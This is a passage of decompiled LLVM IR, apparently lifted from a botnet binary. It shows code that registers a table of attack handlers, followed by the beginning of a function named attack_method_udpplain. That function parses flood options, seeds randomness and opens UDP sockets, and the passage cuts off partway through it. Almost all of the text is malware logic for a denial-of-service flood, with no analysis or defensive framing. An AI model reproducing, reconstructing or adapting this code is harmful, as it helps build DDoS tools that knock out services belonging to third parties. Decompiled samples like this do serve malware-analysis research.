  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_218b4.29, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_a4c0.39 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_a4c0.39 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_89ac.41 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_218b4.29, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.41 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_89ac.41 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_c1dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_218b4.29, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_c1dc.43 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_c1dc.43 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_bae4.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_218b4.29, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_bae4.45 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_bae4.45 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_b330.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_218b4.29, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_b330.47 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_b330.47 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 43900, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_218b4.29, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 43900, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 43900, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9a6c.50 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_218b4.29, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9a6c.50 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9a6c.50 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_93d8.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_218b4.29, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_93d8.52 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_93d8.52 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 35916, i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_218b4.29, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 35916, i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 35916, i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_218b0.27 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_218b1.35 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_218b0.27, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_218b0.27 to i32), { 1, 0 }
}

define i32 @attack_method_udpplain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_89ac = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_89c8, i32* @sl, align 4
  %v0_89d4 = load i32, i32* @r7, align 4
  %v2_89d8 = call i32 @calloc(i32 %v0_89d4, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89e4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_89d8, i32* @r8, align 4
  %v0_89f4 = load i32, i32* @r5, align 4
  %v4_89f8 = inttoptr i32 %v0_89e4 to i32*
  %v5_89f8 = call i32 @attack_get_opt_int(i32 %v0_89f4, i32* %v4_89f8, i32 7, i32 65535)
  %v3_8a00 = urem i32 %v5_89f8, 65536
  %v0_8a04 = load i32, i32* @r6, align 4
  %v0_8a0c = load i32, i32* @r4, align 4
  store i32 %v0_8a0c, i32* %r3.global-to-local, align 4
  %v0_8a10 = load i32, i32* @r5, align 4
  %v5_8a18 = inttoptr i32 %v0_8a04 to i32*
  %v6_8a18 = call i32 @attack_get_opt_int(i32 %v0_8a10, i32* %v5_8a18, i32 6, i32 %v0_8a0c)
  %v0_8a1c = load i32, i32* @r6, align 4
  %v3_8a20 = mul i32 %v6_8a18, 65536
  store i32 %v3_8a20, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_8a2c = load i32, i32* @r5, align 4
  %v4_8a30 = inttoptr i32 %v0_8a1c to i32*
  %v5_8a30 = call i32 @attack_get_opt_int(i32 %v0_8a2c, i32* %v4_8a30, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r6, align 4
  %v0_8a44 = load i32, i32* @r5, align 4
  %v3_8a48 = urem i32 %v5_8a30, 65536
  store i32 %v3_8a48, i32* @r5, align 4
  %v4_8a4c = inttoptr i32 %v0_8a40 to i32*
  %v5_8a4c = call i32 @attack_get_opt_int(i32 %v0_8a44, i32* %v4_8a4c, i32 1, i32 1)
  %v0_8a50 = load i32, i32* %sb.global-to-local, align 4
  %v3_8a50 = udiv i32 %v0_8a50, 65536
  store i32 %v3_8a50, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a58 = load i32, i32* @r4, align 4
  %v9_8a58 = icmp eq i32 %v3_8a50, %v1_8a58
  br i1 %v9_8a58, label %dec_label_pc_8a88, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8a70 = udiv i32 %v0_8a50, 16777216
  store i32 %v4_8a70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8a98

dec_label_pc_8a88:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8a88 = call i32 @rand_next()
  br label %dec_label_pc_8a98

dec_label_pc_8a98:                                ; preds = %bb, %dec_label_pc_8a88
  %v0_8a7c10 = urem i32 %v5_8a4c, 256
  %v0_8a98 = load i32, i32* @r7, align 4
  %v2_8a98 = icmp eq i32 %v0_8a98, 0
  br i1 %v2_8a98, label %dec_label_pc_8bd8, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a98
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8b4c = udiv i32 %v3_8a00, 256
  %v1_8b48 = mul i32 %v5_89f8, 256
  %v4_8b50 = and i32 %v1_8b48, 65280
  %v5_8b50 = or i32 %v4_8b50, %v3_8b4c
  %v2_8ad0 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8b30

dec_label_pc_8ab0:                                ; preds = %bb51, %dec_label_pc_8b70
  %v3_8abc = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_8ac4 = icmp eq i32 %v3_8abc, -1
  %v0_8ac8 = load i32, i32* @sb, align 4
  %v1_8ac8 = add i32 %v0_8ac8, 1
  store i32 %v1_8ac8, i32* @sb, align 4
  %v0_8acc = load i32, i32* @fp, align 4
  %v1_8acc = add i32 %v0_8acc, 24
  store i32 %v1_8acc, i32* @fp, align 4
  %v2_8ad8 = load i32, i32* @r8, align 4
  %v3_8ad8 = add i32 %v2_8ad8, %stack_var_-60.0
  %v4_8ad8 = inttoptr i32 %v3_8ad8 to i32*
  store i32 %v3_8abc, i32* %v4_8ad8, align 4
  br i1 %v7_8ac4, label %dec_label_pc_8bcc, label %dec_label_pc_8ae0

dec_label_pc_8ae0:                                ; preds = %dec_label_pc_8ab0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
